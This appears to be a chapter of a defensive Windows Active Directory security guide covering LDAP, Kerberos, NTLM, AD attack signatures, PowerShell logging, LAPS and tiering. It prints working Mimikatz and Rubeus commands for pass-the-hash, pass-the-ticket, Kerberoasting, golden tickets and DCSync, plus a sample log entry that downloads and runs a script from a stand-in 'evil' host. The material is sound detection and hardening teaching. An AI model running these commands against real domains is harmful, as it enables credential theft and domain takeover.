### 3.8.1. What it is and how it works

AD exposes its database via **LDAP** (RFC 4511) on TCP **389** (cleartext/StartTLS), **636** (LDAPS), and **3268/3269** (Global Catalog). LDAP uses **BER/ASN.1** encoding for messages.

The structure of an **LDAPMessage** (ASN.1):

```
LDAPMessage ::= SEQUENCE {
    messageID       INTEGER (0..maxInt),
    protocolOp      CHOICE { bindRequest, searchRequest, searchResEntry, ... },
    controls        [0] Controls OPTIONAL
}
```

A **searchRequest** contains: `baseObject` (the base DN), `scope` (baseObject=0 / singleLevel=1 / wholeSubtree=2), `derefAliases`, `sizeLimit`, `timeLimit`, `filter`, and `attributes`.

The search filter in RFC 4515 form:

```
(&(objectClass=user)(sAMAccountName=jdoe))
(&(objectClass=user)(servicePrincipalName=*))     # tìm tài khoản có SPN -> Kerberoast
(userAccountControl:1.2.840.113556.1.4.803:=4194304)  # bit DONT_REQ_PREAUTH -> AS-REP roast
```

`1.2.840.113556.1.4.803` is the **matching rule OID LDAP_MATCHING_RULE_BIT_AND** — filtering by the bits of `userAccountControl`.

Important `userAccountControl` (UAC) flags:

| Bit (hex) | Name | Meaning |
|-----------|-----|---------|
| 0x0002 | ACCOUNTDISABLE | Account disabled |
| 0x0200 | NORMAL_ACCOUNT | |
| 0x10000 | DONT_EXPIRE_PASSWORD | |
| 0x400000 (4194304) | DONT_REQ_PREAUTH | Enables AS-REP roasting |
| 0x80000 | TRUSTED_FOR_DELEGATION | Unconstrained delegation (dangerous) |

### 3.8.2. Real-world example

```powershell
# Tìm tài khoản có SPN (mục tiêu Kerberoasting) bằng PowerShell native
([adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))").FindAll() |
  ForEach-Object { $_.Properties.samaccountname }
```

```bash
# ldapsearch (Linux) — bind đơn giản rồi truy vấn
ldapsearch -x -H ldap://10.0.0.10 -D "CORP\jdoe" -w 'Passw0rd!' \
  -b "DC=corp,DC=example,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

> **Security note**: cleartext LDAP on 389 exposes the bind credentials (simple bind). Microsoft recommends **LDAP signing + channel binding** (LDAPS) to prevent MITM/relay. Anomalous LDAP queries (enumerating all users/SPNs) are a sign of recon — detect them via the "Directory Service Access" audit (Event 4662) or network monitoring.

---

## 3.9. Kerberos — authentication step by step

### 3.9.1. What it is and its components

Kerberos v5 (RFC 4120) is the default authentication protocol in AD, based on tickets and **symmetric encryption**. Components:

- **KDC (Key Distribution Center)** = runs on the DC, comprising the **AS (Authentication Service)** and the **TGS (Ticket Granting Service)**.
- **krbtgt**: a special account; the hash of its password is the **key that signs the TGT**.
- **Principal**: a user (`user@REALM`) or a service (`HTTP/web01.corp.com`).

Port: TCP/UDP **88**.

### 3.9.2. The three phases — the full flow

```
   CLIENT                         KDC (AS+TGS)                 SERVICE (web01)
     |   (1) AS-REQ  ----------------->|                            |
     |   <----------- (2) AS-REP  (TGT + session key)               |
     |   (3) TGS-REQ (TGT + SPN) ----->|                            |
     |   <----------- (4) TGS-REP (Service ticket + svc key)        |
     |   (5) AP-REQ (Service ticket + Authenticator) -------------->|
     |   <-------------------- (6) AP-REP (optional mutual auth)     |
```

**Phase 1 — AS-REQ (Authentication Service Request)**

The client sends to the AS. The main fields in `KDC-REQ-BODY`:

| Field | Meaning |
|--------|---------|
| `cname` | The client (user) name |
| `realm` | The realm (uppercase domain) |
| `sname` | The service name = `krbtgt/REALM` |
| `till` | The requested expiration |
| `nonce` | A random number to prevent replay |
| `etype` | A list of preferred encryption types (AES256=18, AES128=17, RC4=23) |
| `padata` | **PA-ENC-TIMESTAMP**: a timestamp encrypted with a key derived from the user's password (pre-authentication) |

> **Pre-authentication**: the client proves it knows the password by encrypting the current timestamp. If an account has pre-auth disabled (the UAC bit DONT_REQ_PREAUTH) → the AS returns an AS-REP without requiring proof → **AS-REP roasting**.

**Phase 2 — AS-REP**

The AS returns:
- The **TGT (Ticket-Granting Ticket)**: encrypted with the **krbtgt key** → the client CANNOT read its contents, only hold it. Inside it contains the session key, the client identity, and the **PAC**.
- The **enc-part**: contains the **TGS session key**, encrypted with the user's key (which the client can decrypt).

The structure of a **Ticket** (KRB_TGT/service ticket, RFC 4120):

```
Ticket ::= [APPLICATION 1] SEQUENCE {
   tkt-vno         [0] INTEGER (5),
   realm           [1] Realm,
   sname           [2] PrincipalName,    -- krbtgt/REALM hoặc SPN
   enc-part        [3] EncryptedData     -- mã hóa bằng key của service/krbtgt
}

EncTicketPart (giải mã ra) ::= {
   flags           -- forwardable, renewable, ...
   key             -- session key
   crealm, cname   -- danh tính client
   authtime, starttime, endtime, renew-till
   authorization-data -- chứa PAC (AD-WIN2K-PAC)
}
```

**Phase 3 — TGS-REQ**

The client wants to access the service `HTTP/web01`. It sends to the TGS:
- The TGT (which it cannot read) in the `padata` field (the AP-REQ wrapper).
- An **Authenticator**: timestamp + cname, encrypted with the **TGS session key** (obtained from the AS-REP) → proving the client possesses the session key.
- `sname` = `HTTP/web01.corp.com`.

**Phase 4 — TGS-REP**

The TGS decrypts the TGT with the krbtgt key, obtains the session key, verifies the authenticator, then issues a **service ticket** encrypted with the **password hash of the service account** (the account that owns the SPN). It includes the service session key (encrypted with the TGS session key).

> **Kerberoasting** attacks here: any user can request a service ticket for any SPN. The service ticket is encrypted with the service account's hash → brute-force it offline to recover the service account password, especially when etype=RC4 (0x17).

**Phase 5 — AP-REQ**

The client sends the service ticket + an authenticator (encrypted with the service session key) to the service itself. The service decrypts the ticket with its own key, obtains the session key, and verifies the authenticator → authenticating the client. The service does **not need to contact the KDC**.

### 3.9.3. PAC — Privilege Attribute Certificate

The PAC (MS-PAC) is embedded in the ticket's `authorization-data` and contains authorization information:

| PAC component | Meaning |
|----------------|---------|
| `KERB_VALIDATION_INFO` (Logon Info) | User SID, **list of group SIDs**, RID, logon time |
| `PAC_CLIENT_INFO` | Name + time |
| `UPN_DNS_INFO` | UPN |
| `Server Signature` | An HMAC signed with the service's key |
| `KDC Signature` | An HMAC signed with the krbtgt key |

> The PAC is how Windows carries **group/SID information** into a ticket so the server can decide permissions without re-querying the DC. The **MS14-068** vulnerability once allowed forging the PAC (placing oneself in Domain Admins) because the server signature check was weak.

### 3.9.4. Real-world example

```cmd
:: Liệt kê vé Kerberos đang cache trong phiên
klist

:: Xóa vé (buộc xin lại) — hữu ích khi debug
klist purge
```

```powershell
# Kerberoasting (Rubeus) — xin TGS cho mọi SPN, xuất hash để crack offline
Rubeus.exe kerberoast /outfile:hashes.txt
# Crack bằng hashcat mode 13100 (Kerberos 5 TGS-REP etype 23/RC4)
# hashcat -m 13100 hashes.txt wordlist.txt
```

> **Detection**: Kerberoasting leaves an **Event 4769** with `TicketEncryptionType=0x17` (RC4) and a `ServiceName` that is a user-SPN account. Many RC4 4769 events in a short time from one account = an alert.

### 3.9.5. Consolidated Kerberos security notes

- Disabling RC4 and forcing AES (etype 17/18) reduces the effectiveness of Kerberoasting.
- Use a **gMSA (Group Managed Service Account)** for service accounts, with a 120-character automatically rotated password → uncrackable.
- Reset `krbtgt` twice periodically to invalidate old golden tickets.

---

## 3.10. NTLM — Challenge/Response

### 3.10.1. The 3-step mechanism

NTLM (NT LAN Manager) is the older protocol, used when Kerberos is unavailable (access by IP, machines not joined to a domain, workgroups). The three messages:

```
CLIENT                                   SERVER
  | (1) NEGOTIATE_MESSAGE  ------------->|   (báo khả năng: flags)
  | <----------- (2) CHALLENGE_MESSAGE   |   (server nonce 8 byte)
  | (3) AUTHENTICATE_MESSAGE  ---------->|   (NTLM response = HMAC dựa trên NT hash + challenge)
```

**Type 2 CHALLENGE_MESSAGE** — the fields:

| Offset | Size | Field | Meaning |
|--------|-----------|--------|---------|
| 0x00 | 8 bytes | Signature | `NTLMSSP\0` (`4E 54 4C 4D 53 53 50 00`) |
| 0x08 | 4 bytes | MessageType | `0x00000002` |
| 0x0C | 8 bytes | TargetName fields | len/maxlen/offset |
| 0x14 | 4 bytes | NegotiateFlags | The negotiation flags |
| 0x18 | 8 bytes | **ServerChallenge** | A random 8-byte nonce |
| 0x20 | 8 bytes | Reserved | |
| 0x28 | 8 bytes | TargetInfo fields | AV_PAIR (domain name, machine, ...) |

**NTLMv2 response** (in AUTHENTICATE): the client computes
`NTProofStr = HMAC-MD5(NTLMv2Hash, ServerChallenge || blob)`
where `NTLMv2Hash = HMAC-MD5(NT-Hash, uppercase(user) || domain)`. The NT-Hash = `MD4(UTF-16LE(password))`.

> **Important**: the server never sees the password, only the NT hash indirectly via the response. But if an attacker has the **NT hash**, they can compute the response without the password → this is exactly the basis of **pass-the-hash**.

### 3.10.2. NTLM vs Kerberos comparison

| Criterion | NTLM | Kerberos |
|----------|------|----------|
| Model | Challenge/response | Ticket |
| Mutual auth | No (by default) | Yes |
| Third party | Not needed (the server asks the DC via Netlogon) | The KDC is needed |
| Use IP instead of name | Possible | No (requires SPN/DNS) |
| Replay | Weaker | Has timestamp + nonce |
| Characteristic attacks | Pass-the-hash, NTLM relay | Pass-the-ticket, Kerberoast, golden ticket |

> **Note**: NTLM authentication at the DC generates **Event 4776**. NTLM relay (forwarding the challenge/response to another machine) is a major attack — defend against it with SMB signing + EPA (Extended Protection for Authentication) + disabling NTLM where possible.

---

## 3.11. Active Directory attacks and their Event ID signatures

### 3.11.1. Pass-the-Hash (PtH)

**Mechanism**: use the NT hash directly (no plaintext needed) to complete NTLM authentication to a remote service (SMB, WMI).

```cmd
:: Mimikatz: tạo logon session mới mang NT hash
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
```

**Signature**: Event **4624 Logon Type 9** + `LogonProcessName=seclogo` + `AuthenticationPackageName=Negotiate`; usually followed by **4624 Type 3** on the target machine accompanied by 4672 (privileges).

### 3.11.2. Pass-the-Ticket (PtT)

**Mechanism**: extract a TGT/service ticket from memory, then inject it into another session.

```cmd
:: Mimikatz: dump rồi nạp lại ticket
sekurlsa::tickets /export
kerberos::ptt [0;abc]-2-0-...-Administrator@krbtgt-CORP.kirbi
```

**Signature**: a Kerberos ticket used from a machine/IP that does not match the original 4768; missing the 4768 that should correspond to the Kerberos activity.

### 3.11.3. Kerberoasting / AS-REP Roasting

The mechanism was described in 3.9. Signature summary:

| Attack | Event | Indicator fields |
|----------|-------|----------------|
| Kerberoasting | 4769 | `TicketEncryptionType=0x17`, ServiceName is a user account with an SPN |
| AS-REP roasting | 4768 | `PreAuthType=0`, the account has the UAC bit DONT_REQ_PREAUTH |

```powershell
# AS-REP roasting (Rubeus): tìm account không yêu cầu pre-auth
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# hashcat -m 18200 asrep.txt wordlist.txt
```

### 3.11.4. Golden Ticket and Silver Ticket

| | Golden Ticket | Silver Ticket |
|---|---------------|---------------|
| Forges | TGT | Service ticket |
| Key required | **krbtgt NT hash** | NT hash of the **service account** |
| Scope | The whole domain (any service) | One specific service |
| Contacts the KDC | No (when used) | No |
| Detection | Hard (a valid TGT); hunt for anomalous TGT lifetimes, no 4768 before 4769 | Similar but limited to 1 SPN |

```cmd
:: Golden ticket (Mimikatz) — cần krbtgt hash + domain SID
kerberos::golden /user:Administrator /domain:corp.example.com ^
  /sid:S-1-5-21-...-1107 /krbtgt:<krbtgt_NTLM_hash> /ptt
```

> **Why the golden ticket is all-powerful**: the TGT is signed with the krbtgt key. If an attacker has the krbtgt hash, they can issue their own TGT with a PAC containing the Domain Admins SID and a 10-year lifetime. Only resetting krbtgt (twice) invalidates it.

### 3.11.5. DCSync

**Mechanism**: impersonate a DC and call the **DRSUAPI** RPC `DRSGetNCChanges` (`IDL_DRSGetNCChanges`) to request replication of secret data (the hashes of all accounts, including krbtgt). This requires the **Replicating Directory Changes** (+ All) right on the domain head.

```cmd
:: Mimikatz: kéo hash của krbtgt qua replication
lsadump::dcsync /domain:corp.example.com /user:krbtgt
```

**Signature**: Event **4662** on the DC with `Properties` containing the GUID of a control access right:
- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes)
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)
- `89e95b76-444d-4c62-991a-0facbeda640c` (DS-Replication-Get-Changes-In-Filtered-Set)

When the `AccessMask` contains these GUIDs from a principal that is **not a DC** = DCSync is in progress.

### 3.11.6. Consolidated signature table

| Attack | Main Event ID | Core indicator |
|----------|----------------|-----------------|
| Pass-the-Hash | 4624 (Type 9), 4776 | LogonProcessName seclogo |
| Pass-the-Ticket | 4624/4769 not matching 4768 | Ticket used from an unfamiliar host |
| Kerberoasting | 4769 | EncType 0x17, user-account SPN |
| AS-REP Roasting | 4768 | PreAuthType 0 |
| Golden Ticket | 4769 with no preceding 4768 | Anomalous TGT lifetime |
| DCSync | 4662 | Replication GUID from a non-DC |
| Service install (PsExec) | 7045, 4697 | Unfamiliar binPath |
| Log clear | 1102, 104 | SubjectUserName |

---

## 3.12. PowerShell Logging

### 3.12.1. Three logging tiers

| Tier | Event ID / Log | What it records |
|-----|----------------|--------|
| **Module Logging** | 4103 (Microsoft-Windows-PowerShell/Operational) | Pipeline + command parameters per module |
| **Script Block Logging** | **4104** (same log) | The full **de-obfuscated** script block content before it runs |
| **Transcription** | A text file | All input/output to a file |

### 3.12.2. Enabling via GPO / Registry

```cmd
:: Script Block Logging (mạnh nhất — ghi cả lệnh đã giải mã base64)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" ^
  /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

:: Module Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" ^
  /v EnableModuleLogging /t REG_DWORD /d 1 /f

:: Transcription ra file
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" ^
  /v EnableTranscripting /t REG_DWORD /d 1 /f
```

> **Why 4104 is powerful**: attackers often use `powershell -enc <base64>` to hide commands. Script Block Logging records the content **after decoding**, so it reveals the real command. An Event 4104 with `Level=Warning` is automatically flagged by the engine when it detects a suspicious pattern (Invoke-Mimikatz, IEX, DownloadString, ...).

A sample Event 4104:

```xml
<EventData>
  <Data Name="MessageNumber">1</Data>
  <Data Name="MessageTotal">1</Data>
  <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')</Data>
  <Data Name="ScriptBlockId">{...}</Data>
</EventData>
```

> **Security note**: attackers downgrade to PowerShell v2 (`powershell -version 2`) to evade script block logging (v2 does not support it). Defense: remove the .NET 2.0/PowerShell v2 engine. AMSI (Antimalware Scan Interface) adds runtime scanning of script content; attackers use AMSI bypasses → monitor for the characteristic bypass strings.

---

## 3.13. LAPS and the Tiering Model

### 3.13.1. LAPS — Local Administrator Password Solution

**The problem it solves**: identical local admin passwords across all machines → a single PtH spreads across the whole domain. LAPS sets a **random, per-machine** local admin password, stores it in AD, and rotates it automatically.

**Mechanism** (classic LAPS):
- Extends the schema with 2 attributes on the computer object:
  - `ms-Mcs-AdmPwd`: the plaintext password (protected by an ACL — only that machine can write it; delegated admins can read it).
  - `ms-Mcs-AdmPwdExpirationTime`: the expiration time (FILETIME).
- The CSE (client-side extension) runs per GPO: if expired → generate a new password, set it for the local admin, and write it up to AD.

**Windows LAPS (new, 2023)**: built in, stores the `msLAPS-Password` attribute, supports **password encryption** (DPAPI-NG, decryptable only by the delegated group), and can also store into Entra ID.

```powershell
# Đọc mật khẩu LAPS của một máy (cần quyền đã ủy quyền)
Get-AdmPwdPassword -ComputerName WS01            # LAPS cổ điển
Get-LapsADPassword -Identity WS01 -AsPlainText   # Windows LAPS
```

> **Security note**: the `ms-Mcs-AdmPwd` attribute is protected by an ACL + usually marked "confidential". You must verify that read access is **not inadvertently granted** to a broad group. Audit LAPS reads (Event 4662 on that attribute).

### 3.13.2. The tiering model (Microsoft Tiering / Enterprise Access Model)

Principle: **high-tier credentials must never touch low-tier machines**.

| Tier | Assets | Administrative accounts |
|------|---------|--------------------|
| **Tier 0** | DCs, AD CS, ADFS, identity control systems | Domain/Enterprise Admins |
| **Tier 1** | Servers, applications, data | Server admins |
| **Tier 2** | Workstations, user devices | Helpdesk/workstation admins |

Rules:
- Tier 0 admins only log on to a **Privileged Access Workstation (PAW)** and to DCs.
- Do not use a Tier 0 account to RDP into a workstation (because the hash would reside in the LSASS of the Tier 2 machine, easy to dump).
- Use **Authentication Policy Silos** + the **Protected Users group** (forbids NTLM, forbids delegation, forces Kerberos AES, does not cache credentials) for sensitive accounts.

```powershell
# Thêm admin vào Protected Users (chống PtH/PtT cho tài khoản đó)
Add-ADGroupMember -Identity "Protected Users" -Members "tier0-admin"

# Tạo Authentication Policy giới hạn TGT lifetime ngắn
New-ADAuthenticationPolicy -Name "T0-Policy" `
  -UserTGTLifetimeMins 240 -ProtectedFromAccidentalDeletion $true
```

> **Why tiering is effective**: most AD attacks rely on **horizontal/vertical credential reuse** (taking an admin's hash from one compromised machine and using it against the DC). Isolating credentials by tier breaks this chain even when one machine is compromised. Protected Users + LSA Protection (`RunAsPPL`) + Credential Guard (isolating secrets in VBS/VTL1) are additional technical defensive layers against LSASS dumping.

### 3.13.3. Credential Guard and LSA Protection

- **LSA Protection (RunAsPPL)**: runs `lsass.exe` as a **Protected Process Light** → other processes (even admins) cannot open a handle to read its memory → blocks Mimikatz `sekurlsa`.
  ```cmd
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
  ```
- **Credential Guard**: uses virtualization-based security (Hyper-V VTL1) to isolate NTLM hashes + Kerberos TGTs in **LSAIso**, which user-mode LSASS cannot access → PtH/PtT on that machine is neutralized.

> **Detecting bypasses**: if Sysmon Event 10 still shows a PROCESS_VM_READ handle to lsass.exe while RunAsPPL is enabled, it means the attacker loaded a driver to strip the PPL protection (BYOVD) — a high-priority alert.

---

## 3.14. Summary: layered defense

| Layer | Measure | Counters |
|-----|-----------|-----------|
| Logging | Sysmon + 4688 cmdline + 4104 + WEF→SIEM | Every phase, anti-forensics |
| Credential | LAPS, gMSA, Protected Users, Credential Guard, RunAsPPL | PtH, PtT, LSASS dumping |
| Kerberos | Disable RC4, reset krbtgt, AES, AuthN Policy | Kerberoast, golden ticket |
| Architecture | Tiering, PAW, LAPS | Lateral movement, privilege escalation |
| Network/protocol | LDAP signing+CB, SMB signing, disable NTLM, EPA | LDAP/NTLM relay |
| AD monitoring | Audit 4662, 4769 EncType, 4624 Type 9 | DCSync, Kerberoast, PtH |

All of the content above provides a foundation for running detection and incident response in Windows/AD environments at a detailed technical level: from the bytes within a hive/ticket/token all the way to the specific Event ID corresponding to each attack technique.
